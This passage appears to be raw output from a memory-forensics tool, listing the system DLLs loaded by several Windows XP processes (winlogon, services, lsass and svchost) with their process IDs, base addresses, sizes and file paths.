620	winlogon.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
620	winlogon.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
620	winlogon.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
620	winlogon.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
620	winlogon.exe	0x776c0000	0x12000	AUTHZ.dll	C:\WINDOWS\system32\AUTHZ.dll	N/A	Disabled
620	winlogon.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
620	winlogon.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
620	winlogon.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
620	winlogon.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
620	winlogon.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
620	winlogon.exe	0x75940000	0x8000	NDdeApi.dll	C:\WINDOWS\system32\NDdeApi.dll	N/A	Disabled
620	winlogon.exe	0x75930000	0xa000	PROFMAP.dll	C:\WINDOWS\system32\PROFMAP.dll	N/A	Disabled
620	winlogon.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\system32\NETAPI32.dll	N/A	Disabled
620	winlogon.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
620	winlogon.exe	0x76bf0000	0xb000	PSAPI.DLL	C:\WINDOWS\system32\PSAPI.DLL	N/A	Disabled
620	winlogon.exe	0x76bc0000	0xf000	REGAPI.dll	C:\WINDOWS\system32\REGAPI.dll	N/A	Disabled
620	winlogon.exe	0x77920000	0xf3000	SETUPAPI.dll	C:\WINDOWS\system32\SETUPAPI.dll	N/A	Disabled
620	winlogon.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
620	winlogon.exe	0x76360000	0x10000	WINSTA.dll	C:\WINDOWS\system32\WINSTA.dll	N/A	Disabled
620	winlogon.exe	0x76c30000	0x2e000	WINTRUST.dll	C:\WINDOWS\system32\WINTRUST.dll	N/A	Disabled
620	winlogon.exe	0x76c90000	0x28000	IMAGEHLP.dll	C:\WINDOWS\system32\IMAGEHLP.dll	N/A	Disabled
620	winlogon.exe	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\system32\WS2_32.dll	N/A	Disabled
620	winlogon.exe	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\system32\WS2HELP.dll	N/A	Disabled
620	winlogon.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
620	winlogon.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
620	winlogon.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
620	winlogon.exe	0x75970000	0xf8000	MSGINA.dll	C:\WINDOWS\system32\MSGINA.dll	N/A	Disabled
620	winlogon.exe	0x5d090000	0x9a000	COMCTL32.dll	C:\WINDOWS\system32\COMCTL32.dll	N/A	Disabled
620	winlogon.exe	0x74320000	0x3e000	ODBC32.dll	C:\WINDOWS\system32\ODBC32.dll	N/A	Disabled
620	winlogon.exe	0x763b0000	0x49000	comdlg32.dll	C:\WINDOWS\system32\comdlg32.dll	N/A	Disabled
620	winlogon.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
620	winlogon.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
620	winlogon.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
620	winlogon.exe	0x940000	0x17000	odbcint.dll	C:\WINDOWS\system32\odbcint.dll	N/A	Disabled
620	winlogon.exe	0x776e0000	0x23000	SHSVCS.dll	C:\WINDOWS\system32\SHSVCS.dll	N/A	Disabled
620	winlogon.exe	0x76bb0000	0x5000	sfc.dll	C:\WINDOWS\system32\sfc.dll	N/A	Disabled
620	winlogon.exe	0x76c60000	0x2a000	sfc_os.dll	C:\WINDOWS\system32\sfc_os.dll	N/A	Disabled
620	winlogon.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
620	winlogon.exe	0x77b40000	0x22000	Apphelp.dll	C:\WINDOWS\system32\Apphelp.dll	N/A	Disabled
620	winlogon.exe	0x755c0000	0x2e000	msctfime.ime	C:\WINDOWS\system32\msctfime.ime	N/A	Disabled
620	winlogon.exe	0x723d0000	0x1c000	WINSCARD.DLL	C:\WINDOWS\system32\WINSCARD.DLL	N/A	Disabled
620	winlogon.exe	0x76f50000	0x8000	WTSAPI32.dll	C:\WINDOWS\system32\WTSAPI32.dll	N/A	Disabled
620	winlogon.exe	0x5ad70000	0x38000	uxtheme.dll	C:\WINDOWS\system32\uxtheme.dll	N/A	Disabled
620	winlogon.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
620	winlogon.exe	0x76600000	0x1d000	cscdll.dll	C:\WINDOWS\system32\cscdll.dll	N/A	Disabled
620	winlogon.exe	0x47020000	0x8000	dimsntfy.dll	C:\WINDOWS\System32\dimsntfy.dll	N/A	Disabled
620	winlogon.exe	0x75950000	0x1a000	WlNotify.dll	C:\WINDOWS\system32\WlNotify.dll	N/A	Disabled
620	winlogon.exe	0x71b20000	0x12000	MPR.dll	C:\WINDOWS\system32\MPR.dll	N/A	Disabled
620	winlogon.exe	0x73000000	0x26000	WINSPOOL.DRV	C:\WINDOWS\system32\WINSPOOL.DRV	N/A	Disabled
620	winlogon.exe	0x68000000	0x36000	rsaenh.dll	C:\WINDOWS\system32\rsaenh.dll	N/A	Disabled
620	winlogon.exe	0x59c00000	0x7000	credssp.dll	C:\WINDOWS\system32\credssp.dll	N/A	Disabled
620	winlogon.exe	0x767f0000	0x29000	schannel.dll	C:\WINDOWS\system32\schannel.dll	N/A	Disabled
620	winlogon.exe	0x7e720000	0xb0000	sxs.dll	C:\WINDOWS\system32\sxs.dll	N/A	Disabled
620	winlogon.exe	0x77c70000	0x25000	msv1_0.dll	C:\WINDOWS\system32\msv1_0.dll	N/A	Disabled
620	winlogon.exe	0x76790000	0xc000	cryptdll.dll	C:\WINDOWS\system32\cryptdll.dll	N/A	Disabled
620	winlogon.exe	0x76d60000	0x19000	iphlpapi.dll	C:\WINDOWS\system32\iphlpapi.dll	N/A	Disabled
620	winlogon.exe	0x71bf0000	0x13000	SAMLIB.dll	C:\WINDOWS\system32\SAMLIB.dll	N/A	Disabled
620	winlogon.exe	0x77a20000	0x54000	cscui.dll	C:\WINDOWS\system32\cscui.dll	N/A	Disabled
620	winlogon.exe	0x1850000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
620	winlogon.exe	0x77690000	0x21000	NTMARTA.DLL	C:\WINDOWS\system32\NTMARTA.DLL	N/A	Disabled
620	winlogon.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
620	winlogon.exe	0x72d20000	0x9000	wdmaud.drv	C:\WINDOWS\system32\wdmaud.drv	N/A	Disabled
620	winlogon.exe	0x72d10000	0x8000	msacm32.drv	C:\WINDOWS\system32\msacm32.drv	N/A	Disabled
620	winlogon.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
620	winlogon.exe	0x77bd0000	0x7000	midimap.dll	C:\WINDOWS\system32\midimap.dll	N/A	Disabled
620	winlogon.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\system32\COMRes.dll	N/A	Disabled
620	winlogon.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
620	winlogon.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\system32\CLBCATQ.DLL	N/A	Disabled
664	services.exe	0x1000000	0x1d000	services.exe	C:\WINDOWS\system32\services.exe	N/A	Disabled
664	services.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
664	services.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
664	services.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
664	services.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
664	services.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
664	services.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
664	services.exe	0x5f770000	0xc000	NCObjAPI.DLL	C:\WINDOWS\system32\NCObjAPI.DLL	N/A	Disabled
664	services.exe	0x76080000	0x65000	MSVCP60.dll	C:\WINDOWS\system32\MSVCP60.dll	N/A	Disabled
664	services.exe	0x7dbd0000	0x51000	SCESRV.dll	C:\WINDOWS\system32\SCESRV.dll	N/A	Disabled
664	services.exe	0x776c0000	0x12000	AUTHZ.dll	C:\WINDOWS\system32\AUTHZ.dll	N/A	Disabled
664	services.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
664	services.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
664	services.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
664	services.exe	0x7dba0000	0x21000	umpnpmgr.dll	C:\WINDOWS\system32\umpnpmgr.dll	N/A	Disabled
664	services.exe	0x76360000	0x10000	WINSTA.dll	C:\WINDOWS\system32\WINSTA.dll	N/A	Disabled
664	services.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\system32\NETAPI32.dll	N/A	Disabled
664	services.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
664	services.exe	0x47260000	0xf000	AcAdProc.dll	C:\WINDOWS\AppPatch\AcAdProc.dll	N/A	Disabled
664	services.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
664	services.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
664	services.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
664	services.exe	0x59c00000	0x7000	credssp.dll	C:\WINDOWS\system32\credssp.dll	N/A	Disabled
664	services.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
664	services.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
664	services.exe	0x767f0000	0x29000	schannel.dll	C:\WINDOWS\system32\schannel.dll	N/A	Disabled
664	services.exe	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\system32\WS2_32.dll	N/A	Disabled
664	services.exe	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\system32\WS2HELP.dll	N/A	Disabled
664	services.exe	0x77b40000	0x22000	Apphelp.dll	C:\WINDOWS\system32\Apphelp.dll	N/A	Disabled
664	services.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
664	services.exe	0x77b70000	0x11000	eventlog.dll	C:\WINDOWS\system32\eventlog.dll	N/A	Disabled
664	services.exe	0x76bf0000	0xb000	PSAPI.DLL	C:\WINDOWS\system32\PSAPI.DLL	N/A	Disabled
664	services.exe	0x76f50000	0x8000	wtsapi32.dll	C:\WINDOWS\system32\wtsapi32.dll	N/A	Disabled
676	lsass.exe	0x1000000	0x6000	lsass.exe	C:\WINDOWS\system32\lsass.exe	N/A	Disabled
676	lsass.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
676	lsass.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
676	lsass.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
676	lsass.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
676	lsass.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
676	lsass.exe	0x75730000	0xb5000	LSASRV.dll	C:\WINDOWS\system32\LSASRV.dll	N/A	Disabled
676	lsass.exe	0x71b20000	0x12000	MPR.dll	C:\WINDOWS\system32\MPR.dll	N/A	Disabled
676	lsass.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
676	lsass.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
676	lsass.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
676	lsass.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
676	lsass.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\system32\NETAPI32.dll	N/A	Disabled
676	lsass.exe	0x767a0000	0x14000	NTDSAPI.dll	C:\WINDOWS\system32\NTDSAPI.dll	N/A	Disabled
676	lsass.exe	0x76f20000	0x27000	DNSAPI.dll	C:\WINDOWS\system32\DNSAPI.dll	N/A	Disabled
676	lsass.exe	0x71ab0000	0x17000	WS2_32.dll	C:\WINDOWS\system32\WS2_32.dll	N/A	Disabled
676	lsass.exe	0x71aa0000	0x8000	WS2HELP.dll	C:\WINDOWS\system32\WS2HELP.dll	N/A	Disabled
676	lsass.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
676	lsass.exe	0x71bf0000	0x13000	SAMLIB.dll	C:\WINDOWS\system32\SAMLIB.dll	N/A	Disabled
676	lsass.exe	0x74440000	0x6a000	SAMSRV.dll	C:\WINDOWS\system32\SAMSRV.dll	N/A	Disabled
676	lsass.exe	0x76790000	0xc000	cryptdll.dll	C:\WINDOWS\system32\cryptdll.dll	N/A	Disabled
676	lsass.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
676	lsass.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
676	lsass.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
676	lsass.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
676	lsass.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
676	lsass.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
676	lsass.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
676	lsass.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
676	lsass.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
676	lsass.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
676	lsass.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
676	lsass.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
676	lsass.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
676	lsass.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
676	lsass.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
676	lsass.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
676	lsass.exe	0x59c00000	0x7000	credssp.dll	C:\WINDOWS\system32\credssp.dll	N/A	Disabled
676	lsass.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
676	lsass.exe	0x71e50000	0x15000	msapsspc.dll	C:\WINDOWS\system32\msapsspc.dll	N/A	Disabled
676	lsass.exe	0x78080000	0x11000	MSVCRT40.dll	C:\WINDOWS\system32\MSVCRT40.dll	N/A	Disabled
676	lsass.exe	0x75b00000	0x15000	digest.dll	C:\WINDOWS\system32\digest.dll	N/A	Disabled
676	lsass.exe	0x747b0000	0x47000	msnsspc.dll	C:\WINDOWS\system32\msnsspc.dll	N/A	Disabled
676	lsass.exe	0x4d200000	0xe000	msprivs.dll	C:\WINDOWS\system32\msprivs.dll	N/A	Disabled
676	lsass.exe	0x71cf0000	0x4c000	kerberos.dll	C:\WINDOWS\system32\kerberos.dll	N/A	Disabled
676	lsass.exe	0x77c70000	0x25000	msv1_0.dll	C:\WINDOWS\system32\msv1_0.dll	N/A	Disabled
676	lsass.exe	0x76d60000	0x19000	iphlpapi.dll	C:\WINDOWS\system32\iphlpapi.dll	N/A	Disabled
676	lsass.exe	0x744b0000	0x65000	netlogon.dll	C:\WINDOWS\system32\netlogon.dll	N/A	Disabled
676	lsass.exe	0x767c0000	0x2d000	w32time.dll	C:\WINDOWS\system32\w32time.dll	N/A	Disabled
676	lsass.exe	0x76080000	0x65000	MSVCP60.dll	C:\WINDOWS\system32\MSVCP60.dll	N/A	Disabled
676	lsass.exe	0x767f0000	0x29000	schannel.dll	C:\WINDOWS\system32\schannel.dll	N/A	Disabled
676	lsass.exe	0x7dfc0000	0x11000	wdigest.dll	C:\WINDOWS\system32\wdigest.dll	N/A	Disabled
676	lsass.exe	0x68000000	0x36000	rsaenh.dll	C:\WINDOWS\system32\rsaenh.dll	N/A	Disabled
676	lsass.exe	0x723a0000	0xf000	tspkg.dll	C:\WINDOWS\system32\tspkg.dll	N/A	Disabled
676	lsass.exe	0x723d0000	0x1c000	WinSCard.dll	C:\WINDOWS\system32\WinSCard.dll	N/A	Disabled
676	lsass.exe	0x76f50000	0x8000	WTSAPI32.dll	C:\WINDOWS\system32\WTSAPI32.dll	N/A	Disabled
676	lsass.exe	0x76360000	0x10000	WINSTA.dll	C:\WINDOWS\system32\WINSTA.dll	N/A	Disabled
676	lsass.exe	0x74410000	0x2f000	scecli.dll	C:\WINDOWS\system32\scecli.dll	N/A	Disabled
676	lsass.exe	0x77920000	0xf3000	SETUPAPI.dll	C:\WINDOWS\system32\SETUPAPI.dll	N/A	Disabled
676	lsass.exe	0x743e0000	0x2f000	ipsecsvc.dll	C:\WINDOWS\system32\ipsecsvc.dll	N/A	Disabled
676	lsass.exe	0x776c0000	0x12000	AUTHZ.dll	C:\WINDOWS\system32\AUTHZ.dll	N/A	Disabled
676	lsass.exe	0x7ea50000	0xd2000	oakley.DLL	C:\WINDOWS\system32\oakley.DLL	N/A	Disabled
676	lsass.exe	0x74370000	0xb000	WINIPSEC.DLL	C:\WINDOWS\system32\WINIPSEC.DLL	N/A	Disabled
676	lsass.exe	0x743a0000	0xb000	pstorsvc.dll	C:\WINDOWS\system32\pstorsvc.dll	N/A	Disabled
676	lsass.exe	0x71a50000	0x3f000	mswsock.dll	C:\WINDOWS\system32\mswsock.dll	N/A	Disabled
676	lsass.exe	0x662b0000	0x58000	hnetcfg.dll	C:\WINDOWS\system32\hnetcfg.dll	N/A	Disabled
676	lsass.exe	0x71a90000	0x8000	wshtcpip.dll	C:\WINDOWS\System32\wshtcpip.dll	N/A	Disabled
676	lsass.exe	0x743c0000	0x1b000	psbase.dll	C:\WINDOWS\system32\psbase.dll	N/A	Disabled
676	lsass.exe	0x68100000	0x26000	dssenh.dll	C:\WINDOWS\system32\dssenh.dll	N/A	Disabled
836	svchost.exe	0x1000000	0x6000	svchost.exe	C:\WINDOWS\system32\svchost.exe	N/A	Disabled
836	svchost.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
836	svchost.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
836	svchost.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
836	svchost.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
836	svchost.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
836	svchost.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
836	svchost.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
836	svchost.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
836	svchost.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
836	svchost.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
836	svchost.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
836	svchost.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
836	svchost.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
836	svchost.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
836	svchost.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
836	svchost.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
836	svchost.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
836	svchost.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
836	svchost.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
836	svchost.exe	0x76390000	0x1d000	IMM32.DLL	C:\WINDOWS\system32\IMM32.DLL	N/A	Disabled
836	svchost.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
836	svchost.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
836	svchost.exe	0x773d0000	0x103000	comctl32.dll	C:\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	N/A	Disabled
836	svchost.exe	0x5d090000	0x9a000	comctl32.dll	C:\WINDOWS\system32\comctl32.dll	N/A	Disabled
836	svchost.exe	0x77690000	0x21000	NTMARTA.DLL	C:\WINDOWS\system32\NTMARTA.DLL	N/A	Disabled
836	svchost.exe	0x71bf0000	0x13000	SAMLIB.dll	C:\WINDOWS\system32\SAMLIB.dll	N/A	Disabled
836	svchost.exe	0x76f60000	0x2c000	WLDAP32.dll	C:\WINDOWS\system32\WLDAP32.dll	N/A	Disabled
836	svchost.exe	0x76a80000	0x64000	rpcss.dll	c:\windows\system32\rpcss.dll	N/A	Disabled
836	svchost.exe	0x71ab0000	0x17000	WS2_32.dll	c:\windows\system32\WS2_32.dll	N/A	Disabled
836	svchost.exe	0x71aa0000	0x8000	WS2HELP.dll	c:\windows\system32\WS2HELP.dll	N/A	Disabled
836	svchost.exe	0x6e0000	0x2c5000	xpsp2res.dll	C:\WINDOWS\system32\xpsp2res.dll	N/A	Disabled
836	svchost.exe	0x59c00000	0x7000	credssp.dll	C:\WINDOWS\system32\credssp.dll	N/A	Disabled
836	svchost.exe	0x77a80000	0x97000	CRYPT32.dll	C:\WINDOWS\system32\CRYPT32.dll	N/A	Disabled
836	svchost.exe	0x77b20000	0x12000	MSASN1.dll	C:\WINDOWS\system32\MSASN1.dll	N/A	Disabled
836	svchost.exe	0x767f0000	0x29000	schannel.dll	C:\WINDOWS\system32\schannel.dll	N/A	Disabled
836	svchost.exe	0x5b860000	0x56000	NETAPI32.dll	C:\WINDOWS\system32\NETAPI32.dll	N/A	Disabled
836	svchost.exe	0x76fd0000	0x7f000	CLBCATQ.DLL	C:\WINDOWS\system32\CLBCATQ.DLL	N/A	Disabled
836	svchost.exe	0x77050000	0xc5000	COMRes.dll	C:\WINDOWS\system32\COMRes.dll	N/A	Disabled
836	svchost.exe	0x760f0000	0x53000	termsrv.dll	c:\windows\system32\termsrv.dll	N/A	Disabled
836	svchost.exe	0x74f70000	0x6000	ICAAPI.dll	c:\windows\system32\ICAAPI.dll	N/A	Disabled
836	svchost.exe	0x77920000	0xf3000	SETUPAPI.dll	c:\windows\system32\SETUPAPI.dll	N/A	Disabled
836	svchost.exe	0x76c30000	0x2e000	WINTRUST.dll	c:\windows\system32\WINTRUST.dll	N/A	Disabled
836	svchost.exe	0x76c90000	0x28000	IMAGEHLP.dll	C:\WINDOWS\system32\IMAGEHLP.dll	N/A	Disabled
836	svchost.exe	0x776c0000	0x12000	AUTHZ.dll	c:\windows\system32\AUTHZ.dll	N/A	Disabled
836	svchost.exe	0x75110000	0x1f000	mstlsapi.dll	c:\windows\system32\mstlsapi.dll	N/A	Disabled
836	svchost.exe	0x77cc0000	0x32000	ACTIVEDS.dll	c:\windows\system32\ACTIVEDS.dll	N/A	Disabled
836	svchost.exe	0x76e10000	0x25000	adsldpc.dll	c:\windows\system32\adsldpc.dll	N/A	Disabled
836	svchost.exe	0x76b20000	0x11000	ATL.DLL	c:\windows\system32\ATL.DLL	N/A	Disabled
836	svchost.exe	0x76bc0000	0xf000	REGAPI.dll	C:\WINDOWS\system32\REGAPI.dll	N/A	Disabled
836	svchost.exe	0x68000000	0x36000	rsaenh.dll	C:\WINDOWS\system32\rsaenh.dll	N/A	Disabled
836	svchost.exe	0x77b40000	0x22000	Apphelp.dll	C:\WINDOWS\system32\Apphelp.dll	N/A	Disabled
904	svchost.exe	0x1000000	0x6000	svchost.exe	C:\WINDOWS\system32\svchost.exe	N/A	Disabled
904	svchost.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
904	svchost.exe	0x7c800000	0xf6000	kernel32.dll	C:\WINDOWS\system32\kernel32.dll	N/A	Disabled
904	svchost.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
904	svchost.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
904	svchost.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
904	svchost.exe	0x5cb70000	0x26000	ShimEng.dll	C:\WINDOWS\system32\ShimEng.dll	N/A	Disabled
904	svchost.exe	0x6f880000	0x1ca000	AcGenral.DLL	C:\WINDOWS\AppPatch\AcGenral.DLL	N/A	Disabled
904	svchost.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
904	svchost.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
904	svchost.exe	0x76b40000	0x2d000	WINMM.dll	C:\WINDOWS\system32\WINMM.dll	N/A	Disabled
904	svchost.exe	0x774e0000	0x13e000	ole32.dll	C:\WINDOWS\system32\ole32.dll	N/A	Disabled
904	svchost.exe	0x77c10000	0x58000	msvcrt.dll	C:\WINDOWS\system32\msvcrt.dll	N/A	Disabled
904	svchost.exe	0x77120000	0x8b000	OLEAUT32.dll	C:\WINDOWS\system32\OLEAUT32.dll	N/A	Disabled
904	svchost.exe	0x77be0000	0x15000	MSACM32.dll	C:\WINDOWS\system32\MSACM32.dll	N/A	Disabled
904	svchost.exe	0x77c00000	0x8000	VERSION.dll	C:\WINDOWS\system32\VERSION.dll	N/A	Disabled
904	svchost.exe	0x7c9c0000	0x818000	SHELL32.dll	C:\WINDOWS\system32\SHELL32.dll	N/A	Disabled
904	svchost.exe	0x77f60000	0x76000	SHLWAPI.dll	C:\WINDOWS\system32\SHLWAPI.dll	N/A	Disabled
904	svchost.exe	0x769c0000	0xb4000	USERENV.dll	C:\WINDOWS\system32\USERENV.dll	N/A	Disabled
904	svchost.exe	0x5ad70000	0x38000	UxTheme.dll	C:\WINDOWS\system32\UxTheme.dll	N/A	Disabled
